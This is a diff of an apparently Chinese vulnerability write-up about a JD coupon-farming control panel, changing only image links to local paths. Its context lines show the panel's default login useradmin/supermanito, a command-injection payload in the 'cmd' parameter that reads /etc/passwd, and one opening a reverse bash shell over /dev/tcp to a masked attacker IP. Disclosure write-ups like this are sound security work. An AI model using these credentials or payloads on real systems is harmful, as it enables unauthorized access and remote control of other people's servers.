@@ -22,7 +22,7 @@ title="京东薅羊毛控制面板"
 
 访问后登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101952995.png)
+![](./images/202202101952995.png)
 
 
 
@@ -30,7 +30,7 @@ title="京东薅羊毛控制面板"
 
 **useradmin/supermanito**
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101952574.png)
+![](./images/202202101952574.png)
 
 
 
@@ -60,7 +60,7 @@ cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101952947.png)
+![](./images/202202101952947.png)
 
 
 
@@ -74,6 +74,6 @@ cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101952367.png)
+![](./images/202202101952367.png)
 
 ## 
